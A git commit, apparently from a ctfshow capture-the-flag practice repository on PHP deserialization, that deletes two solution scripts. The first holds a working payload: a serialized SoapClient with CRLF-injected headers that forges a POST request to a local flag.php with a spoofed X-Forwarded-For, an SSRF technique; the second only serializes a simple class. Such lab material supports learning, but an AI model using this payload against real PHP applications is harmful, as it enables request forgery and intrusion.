b3e00213317ed79119b956a9464935a876295b7e
AliceInCradle <cs18229177770@outlook.com>
2023-10-08 18:29:58 +0800

    update

--- Web入门/反序列化/php/web259.php
+++
@@ -1,6 +0,0 @@
-<?php
-	$post_string = "token=ctfshow";
-    $a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'user_agent'=>"aaaaaa\r\nContent-Type:application/x-www-form-urlencoded\r\n"."X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
-    $b = serialize($a);
-    echo urlencode($b);
-?>
--- Web入门/反序列化/php/web266.php
+++
@@ -1,7 +0,0 @@
-<?php
-class ctfshow{
-    public $username='xxxxxx';
-    public $password='xxxxxx';
-}
-echo serialize(new ctfshow())
-?>
